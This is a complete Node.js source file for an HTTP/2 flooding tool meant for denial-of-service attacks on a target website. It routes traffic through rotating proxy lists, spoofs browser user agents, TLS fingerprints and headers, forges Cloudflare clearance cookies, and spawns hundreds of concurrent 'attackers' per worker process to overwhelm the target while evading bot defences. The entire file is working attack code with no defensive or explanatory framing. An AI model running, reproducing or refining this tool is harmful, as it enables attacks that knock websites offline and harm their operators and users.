const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require('os');
const v8 = require("v8");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`node m target time rate thread proxyfile`);
    process.exit();
}

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
];

const lang_header = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9',
    'fr-FR,fr;q=0.9,en-US;q=0.8',
];

const encoding_header = ["gzip, deflate, br", "gzip, deflate", "*"];
const control_header = ["no-cache", "max-age=0"];
const dest_header = ['document', 'script', 'image'];
const mode_header = ['navigate', 'cors'];
const site_header = ['same-origin', 'cross-site'];
const refers = [
    'google.com', 'youtube.com', 'facebook.com', 'wikipedia.org', 'reddit.com',
];

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.56.89 Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/127.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
];

const cplist = [
    "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
];

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:rsa_pkcs1_sha1";
const ecdhCurve = ["x25519", "secp256r1", "secp384r1"];
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3;
const secureContext = tls.createSecureContext({ ciphers: cplist.join(':'), sigalgs, secureOptions });

const Methods = ["GET", "POST"];
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    icecool: process.argv.includes('--icecool'),
    dual: process.argv.includes('--dual'),
    brave: process.argv.includes('--brave')
};

function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, "utf-8").split(/\r?\n/).filter(Boolean);
    } catch (e) {
        console.error(`Failed to read proxy file: ${filePath}`);
        process.exit(1);
    }
}

var proxies = readLines(args.proxyFile);
if (args.icecool) {
    proxies = proxies.filter(proxy => proxy.includes(':'));
    console.log(`Random proxy: ${proxies.length} proxy loaded`);
}

const parsedTarget = url.parse(args.target);

class NetSocket {
    constructor() {}
    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });
        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);
        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();
const MAX_RAM_PERCENTAGE = 75;
const RESTART_DELAY = 3000;
const DESIRED_ATTACKERS_PER_WORKER = 500;
const PROXY_ROTATION_INTERVAL = 30000;

if (cluster.isMaster) {
    console.clear();
    console.log(`Target: ${process.argv[2]}`);
    console.log(`Time: ${process.argv[3]}`);
    console.log(`Rate: ${process.argv[4]}`);
    console.log(`Threads: ${process.argv[5]}`);
    console.log(`Proxy File: ${process.argv[6]}`);
    console.log("Heap Size:", (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toString());
    console.log(`IceCool: ${args.icecool}, Dual: ${args.dual}, Brave: ${args.brave}`);
    console.log(`Attempting to maintain ${DESIRED_ATTACKERS_PER_WORKER} attackers per worker.`);

    const restartScript = () => {
        for (const id in cluster.workers) cluster.workers[id].kill();
        console.log('Restarting in', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) cluster.fork();
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('Max RAM usage reached:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 10000);

    for (let counter = 1; counter <= args.threads; counter++) cluster.fork();
    setTimeout(() => process.exit(1), args.time * 1000);

    setInterval(() => {
        proxies = readLines(args.proxyFile);
        console.log('Proxies rotated');
    }, PROXY_ROTATION_INTERVAL);
} else {
    let currentAttackersCount = 0;
    let proxyIndex = 0;
    
    function getNextProxy() {
        if (proxies.length === 0) return null;
        const proxy = proxies[proxyIndex % proxies.length];
        proxyIndex++;
        return proxy;
    }

    function launchAttacker() {
        if (currentAttackersCount >= DESIRED_ATTACKERS_PER_WORKER) return;
        const proxyAddr = getNextProxy();
        if (!proxyAddr) return;
        currentAttackersCount++;
        runFlooderInstance(proxyAddr, () => {
            currentAttackersCount--;
            launchAttacker();
        });
    }

    for (let i = 0; i < DESIRED_ATTACKERS_PER_WORKER; i++) launchAttacker();
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function bexRandomString(min, max) {
    const length = randomIntn(min, max);
    const mask = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({length}, () => mask[Math.floor(Math.random() * mask.length)]).join('');
}

function sanitizePath(path) {
    return path.replace(/[^a-zA-Z0-9-_./?&=]/g, '');
}

function generateHeaders() {
    const ua = randomElement(userAgents);
    const Ref = randomElement(refers);
    const chromeVersion = randomIntn(120, 128);
    const isAjax = Math.random() < 0.5;
    const method = isAjax ? randomElement(Methods) : 'GET';
    const cookie = `session_id=${crypto.randomBytes(16).toString('hex')}; _cfuid=${crypto.randomBytes(16).toString('hex')}; cf_clearance=${crypto.randomBytes(16).toString('hex')};`;
    
    let path = parsedTarget.path.replace("%RAND%", bexRandomString(12, 20));
    path = sanitizePath(path);
    const queryParams = `?${bexRandomString(5,10)}=${bexRandomString(5,10)}&${bexRandomString(5,10)}=${bexRandomString(5,10)}`;
    path += queryParams;

    return {
        ":method": method,
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": path,
        'User-Agent': ua,
        'Accept': isAjax ? 'application/json, text/plain, */*' : randomElement(accept_header),
        'Accept-Language': randomElement(lang_header),
        'Accept-Encoding': randomElement(encoding_header),
        "cache-control": randomElement(control_header),
        "sec-fetch-mode": randomElement(mode_header),
        "sec-fetch-site": randomElement(site_header),
        "sec-fetch-dest": randomElement(dest_header),
        "sec-ch-ua": `"Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}", "Not-A.Brand";v="8"`,
        "Sec-CH-UA-Full-Version-List": `"Google Chrome";v="${chromeVersion}.0.0.0", " Not A;Brand";v="99.0.0.0", "Chromium";v="${chromeVersion}.0.0.0"`,
        "sec-ch-ua-platform": `"${randomElement(['Windows', 'Macintosh', 'Linux', 'Android', 'iOS'])}"`,
        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
        'Sec-Fetch-User': isAjax ? undefined : '?1',
        'Sec-GPC': '1',
        ...(Math.random() < 0.2 ? {'Upgrade-Insecure-Requests': '1'} : {}),
        ...(Math.random() < 0.2 ? {"Cache-Control": "max-age=0"} : {}),
        'Cookie': Math.random() < 0.25 
            ? cookie + `; extra_cookie=${crypto.randomBytes(16).toString('hex')}` 
            : cookie,
        'Pragma': Math.random() < 0.25 ? `no-cache` : `max-age=0`,
        "Referer": `https://${Ref}`,
        "Origin": `https://${parsedTarget.host}`,
        "TE": "trailers",
        "DNT": "1",
        "Upgrade-Insecure-Requests": isAjax ? undefined : "1",
        'X-Requested-With': isAjax ? 'XMLHttpRequest' : undefined,
    };
}

function runFlooderInstance(proxyAddress, onCompletionCallback) {
    const parsedProxy = proxyAddress.split(":");
    const headersTemplate = generateHeaders();
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            onCompletionCallback();
            return;
        }

        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: randomElement(cplist),
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: randomElement(ecdhCurve),
            secureContext: secureContext,
            honorCipherOrder: true,
            rejectUnauthorized: false,
            secureProtocol: Math.random() < 0.5 ? 'TLSv1_2_method' : 'TLSv1_3_method',
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };

        if (args.brave) {
            tlsOptions.ALPNProtocols = ["h2"];
            tlsOptions.secureProtocol = 'TLSv1_3_method';
            headersTemplate['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.56.89 Chrome/127.0.0.0 Safari/537.36";
        }

        const tlsBex = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsBex.allowHalfOpen = true;
        tlsBex.setNoDelay(true);
        tlsBex.setKeepAlive(true, args.time * 1000);
        tlsBex.setMaxListeners(0);

        tlsBex.on('error', () => {
            if (!connection.destroyed) connection.destroy();
            onCompletionCallback();
        });

        tlsBex.on('close', () => {
            if (!connection.destroyed) connection.destroy();
            onCompletionCallback();
        });

        const bexClient = http2.connect(parsedTarget.href, {
            protocol: "https:",
            createConnection: () => tlsBex,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 65535,
                maxFrameSize: 16384,
                enablePush: false
            }
        });

        bexClient.on("connect", () => {
            const requestRate = args.dual ? args.Rate * 2 : args.Rate;
            const baseInterval = requestRate > 0 ? (1000 / requestRate) : 1000;
            const jitterRange = args.icecool ? 500 : 100;
            let active = true;

            setTimeout(() => {
                active = false;
                bexClient.destroy();
                connection.destroy();
                onCompletionCallback();
            }, args.time * 1000);

            function sendRequest() {
                if (!active || bexClient.destroyed || bexClient.closed || !bexClient.socket || bexClient.socket.destroyed) {
                    return;
                }

                let currentPath = parsedTarget.path.replace("%RAND%", bexRandomString(12, 20));
                currentPath = sanitizePath(currentPath);
                if (Math.random() < 0.1) {
                    currentPath = `/${bexRandomString(5,10)}`;
                }
                const isAjax = Math.random() < 0.5;
                const method = isAjax ? randomElement(Methods) : 'GET';
                const dynamicHeaders = {
                    ...headersTemplate,
                    ":path": currentPath,
                    ":method": method,
                    'X-Requested-With': isAjax ? 'XMLHttpRequest' : undefined,
                    'Accept': isAjax ? 'application/json, text/plain, */*' : randomElement(accept_header),
                };

                if (method === "POST") {
                    const body = isAjax ? JSON.stringify({ data: bexRandomString(10, 20) }) : `key=${bexRandomString(5,15)}`;
                    dynamicHeaders["Content-Type"] = isAjax ? "application/json" : "application/x-www-form-urlencoded";
                    dynamicHeaders["Content-Length"] = Buffer.byteLength(body);
                    const bex = bexClient.request(dynamicHeaders);
                    bex.write(body);
                    bex.on('response', response => {
                        response.on('data', () => {});
                        response.on('end', () => {});
                        bex.close();
                        if (!bex.destroyed) bex.destroy();
                    });
                    bex.on('error', () => {
                        bex.close();
                        if (!bex.destroyed) bex.destroy();
                    });
                    bex.end();
                } else {
                    const bex = bexClient.request(dynamicHeaders);
                    bex.on('response', response => {
                        response.on('data', () => {});
                        response.on('end', () => {});
                        bex.close();
                        if (!bex.destroyed) bex.destroy();
                    });
                    bex.on('error', () => {
                        bex.close();
                        if (!bex.destroyed) bex.destroy();
                    });
                    bex.end();
                }

                const jitter = randomIntn(-jitterRange, jitterRange);
                const nextDelay = Math.max(0, baseInterval + jitter);
                if (Math.random() < 0.05) {
                    setTimeout(sendRequest, nextDelay + randomIntn(1000, 5000));
                } else {
                    setTimeout(sendRequest, nextDelay);
                }
            }
            sendRequest();
        });

        bexClient.on("close", () => {
            if (!connection.destroyed) connection.destroy();
            onCompletionCallback();
        });

        bexClient.on("error", () => {
            if (!connection.destroyed) connection.destroy();
            onCompletionCallback();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000 + 2000);

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSupport', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.on('uncaughtException', function(e) {
    if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return;
}).on('unhandledRejection', function(e) {
    if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return;
}).on('warning', e => {
    if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return;
}).setMaxListeners(0);